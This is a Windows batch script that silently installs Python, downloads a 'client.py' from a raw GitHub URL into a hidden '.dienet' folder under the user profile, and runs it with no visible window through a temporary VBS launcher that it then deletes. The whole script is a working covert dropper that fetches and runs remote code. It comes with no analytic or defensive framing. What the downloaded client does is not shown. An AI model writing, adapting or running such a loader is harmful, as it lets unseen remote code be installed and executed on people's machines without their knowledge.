@echo off
set "PYTHON_URL=https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
set "CLIENT_URL=https://raw.githubusercontent.com/glitech01x/client/refs/heads/main/client.py"
set "TARGET_DIR=%USERPROFILE%\.dienet"
set "CLIENT_PATH=%TARGET_DIR%\client.py"

:: 1. Create hidden directory
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

:: 2. Check for Python. If missing, download and install silently.
python --version >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Invoke-WebRequest -Uri '%PYTHON_URL%' -OutFile '%TEMP%\py_inst.exe'"
    start /wait "" "%TEMP%\py_inst.exe" /quiet InstallAllUsers=0 Include_launcher=0 Include_test=0 SimpleInstall=1
    del "%TEMP%\py_inst.exe"
)

:: 3. Download the latest client code
powershell -Command "Invoke-WebRequest -Uri '%CLIENT_URL%' -OutFile '%CLIENT_PATH%'"

:: 4. Launch the code in total silence (No Window)
:: We create a temporary VBS script to run the python command hidden.
echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP%\launcher.vbs"
echo WshShell.Run "python """ ^& "%CLIENT_PATH%" ^& """", 0, False >> "%TEMP%\launcher.vbs"

wscript.exe "%TEMP%\launcher.vbs"
del "%TEMP%\launcher.vbs"
exit
